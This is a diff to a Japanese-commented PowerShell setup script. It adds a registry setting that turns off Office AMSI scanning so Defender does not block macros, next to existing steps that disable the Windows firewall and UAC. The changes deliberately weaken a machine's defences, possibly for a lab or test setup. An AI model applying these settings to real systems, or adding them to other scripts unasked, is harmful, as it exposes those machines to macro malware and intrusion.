@@ -29,6 +29,21 @@ try {
     netsh advfirewall set allprofiles state off
 } catch { LogError "ファイアウォール無効化失敗: $($_.Exception.Message)" }
 
+# Office AMSI スキャンを無効化（Defenderによるマクロブロック回避）
+try {
+    Log "Office AMSI スキャン無効化レジストリ設定（DisableOfficeAMSI=1）"
+
+    $officeSecurityPath = "HKLM:\SOFTWARE\Microsoft\Office\16.0\Common\Security"
+    if (!(Test-Path $officeSecurityPath)) {
+        New-Item -Path $officeSecurityPath -Force | Out-Null
+    }
+    New-ItemProperty -Path $officeSecurityPath -Name "DisableOfficeAMSI" -PropertyType DWord -Value 1 -Force | Out-Null
+
+    Log "Office AMSI スキャン無効化設定完了"
+} catch {
+    LogError "Office AMSI スキャン無効化設定失敗: $($_.Exception.Message)"
+}
+
 # UAC無効化
 try {
     Log "UACを無効化"
